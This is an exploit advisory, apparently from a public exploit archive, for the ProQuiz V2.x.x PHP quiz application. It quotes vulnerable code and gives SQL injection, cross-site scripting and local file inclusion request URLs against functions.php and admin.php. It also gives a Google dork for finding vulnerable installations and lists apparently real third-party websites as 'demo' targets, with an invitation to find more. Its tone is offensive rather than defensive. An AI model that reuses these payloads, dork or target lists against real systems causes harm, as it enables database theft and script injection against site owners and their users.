# Exploit Title : ProQuiz V2.x.x => Multiple Vulnerabilities 
# Google Dork : "Powered by Softon Technologies"
# Date : 15/02/2014
# Exploit Author : JoKeR_StEx
# Vendor Homepage : http://proquiz.softon.org/
# Version : V2.x.x
# Tested on : Windows 
# CVE : [~]
###########################################################################

[+] Description : 

ProQuize V2.x.x affected by SQL injection and Cross Site Scripting & LFI 
The vulnerabilities in parametere  username & email in file functions about register 

[-] Vulnerable Code : 

# Line 610=>634 

 if(!empty($_GET[&#039;username&#039;])){
    if($_GET[&#039;username&#039;]==$_SESSION[&#039;UA_DETAILS&#039;][&#039;username&#039;]){
        echo "true";
    }else{
        if(checkUsernameExists($db,$_GET[&#039;username&#039;])){
            echo "false";
        }else{
            echo "true";
        }
    }
    
}

if(!empty($_GET[&#039;email&#039;])){
    if($_GET[&#039;email&#039;]==$_SESSION[&#039;UA_DETAILS&#039;][&#039;email&#039;]){
        echo "true";
    }else{
        if(checkEmailExists($db,$_GET[&#039;email&#039;])){
            echo "false";
        }else{
            echo "true";
        }
    }
    
}
The Vulnerability in para username : the coder use function CheckUsernameExists() for get username 
for confirm if already exists use var $db from class database in file Database.class.php and para2 $_GET[&#039;username&#039;]
for get info for confirm 

The Same Things With email; 

[+] Exploit 

Dork: "Powered by Softon Technologies"

1-Sql injection 
http://127.0.0.1/ProQuiz%20V2.0.1/functions.php?username=[SQli]
http://127.0.0.1/ProQuiz%20V2.0.1/functions.php?email=[SQli]


2-Cross Site scripting 
http://127.0.0.1/ProQuiz%20V2.0.1/functions.php?username=%22%3E%3Cscript%3Ealert%28%27Xss%27%29;%3C/script%3E
http://127.0.0.1/ProQuiz%20V2.0.1/functions.php?email=%22%3E%3Cscript%3Ealert%28%27Xss%27%29;%3C/script%3E

3-LFI 
About LFI IN THE file admin.php 
code : 
if($_GET[&#039;action&#039;]==&#039;getpage&#039; && !empty($_GET[&#039;page&#039;])){
                            @include_once($_GET[&#039;page&#039;].&#039;.php&#039;);   
                        }else{
                            echo getContents($db,&#039;admin_panel&#039;);
                        }
http://127.0.0.1/ProQuiz%20V2.0.1/admin.php?action=getpage&page=[file] 
when you include file don&#039;t create the type of the file just put the name of the file 
because you can only include php file  

[+] Demo : 
http://webexamiq.com/functions.php?username=[SQLI]or[XSS]
http://webexamiq.com/functions.php?email=[SQLI]or[XSS]
http://energia.com.br/web/quiz/functions.php?username=[SQLI]or[XSS]
http://energia.com.br/web/quiz/functions.php?email=[SQLI]or[XSS]
http://effchurch.org/pquiz/functions.php?username=[SQLI]or[XSS]

You Can Find More Websites Infected In Google ^____^&#039; 


^___-&#039; Enjoy ^____^ 

###################
http://www.th3xploiterz.com/
The Black Devils 
Dz Crazy L33ts
###################
###########################Gr33tings################################################################
Gr33t&#039;z to : Assesino04, Shield Dz, Eve Dized , Dr.0ryx & My Familly & All Algerians and My Friends
####################################################################################################
Email : jokerdz44@yahoo.fr
Facebook : fb.me/imadlilong.lasvegas 
Twitter : @JoKeR_StEx

